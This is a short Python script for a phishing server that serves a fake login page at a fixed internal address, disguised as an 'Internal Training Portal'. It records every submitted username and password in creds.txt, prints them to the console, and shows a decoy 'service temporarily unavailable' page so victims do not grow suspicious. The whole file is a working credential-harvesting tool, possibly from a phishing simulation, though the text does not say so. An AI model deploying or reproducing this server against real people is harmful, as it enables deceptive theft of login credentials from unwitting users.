#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/fake-login.html":
            self.send_response(200)
            self.end_headers()
            self.wfile.write(open("/home/ubuntu/fake-login.html", "rb").read())
            return

        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length).decode(errors="ignore")
        fields = parse_qs(body)

        user = fields.get("username", [""])[0]
        pwd = fields.get("password", [""])[0]

        with open("/home/ubuntu/creds.txt", "a") as f:
            f.write("username=%s password=%s\n" % (user, pwd))

        print("CAPTURED username=%s password=%s" % (user, pwd))

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"""
<html>
<head><title>Internal Training Portal</title></head>
<body>
<h2>Internal Training Portal</h2>
<p>Authentication service is temporarily unavailable.</p>
<p>Please try again later or contact the training administrator.</p>
</body>
</html>
""")

print("Training portal re-authentication service listening on http://192.168.10.50/fake-login.html")
HTTPServer(("0.0.0.0", 80), Handler).serve_forever()
